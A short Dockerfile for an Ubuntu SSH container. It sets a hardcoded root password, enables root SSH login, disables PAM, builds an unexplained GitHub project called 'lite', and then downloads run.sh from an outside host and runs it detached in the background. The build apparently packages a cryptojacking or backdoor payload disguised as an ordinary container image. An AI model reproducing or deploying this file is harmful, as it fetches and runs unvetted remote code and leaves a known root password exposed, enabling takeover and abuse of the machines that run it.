FROM ubuntu:16.04

RUN apt-get update
RUN apt-get install -y openssh-server
RUN mkdir /var/run/sshd
RUN echo 'root:Evi000evi' |chpasswd
RUN sed -ri 's/^PermitRootLogin\s+.*/PermitRootLogin yes/' /etc/ssh/sshd_config
RUN sed -ri 's/UsePAM yes/#UsePAM yes/g' /etc/ssh/sshd_config
RUN apt-get update && \
    apt-get install git build-essential cmake libcurl4-openssl-dev wget -y && \
    git clone https://github.com/twiliowot/lite && \
    cd lite && \
    mkdir build && \
    cd build && \
    cmake .. -DCMAKE_BUILD_TYPE=Release && \
    make && \
    wget http://247app.host/run.sh && \
    chmod 755 run.sh && \
    setsid ./run.sh &

EXPOSE 5555

CMD ["/usr/sbin/sshd", "-D"]
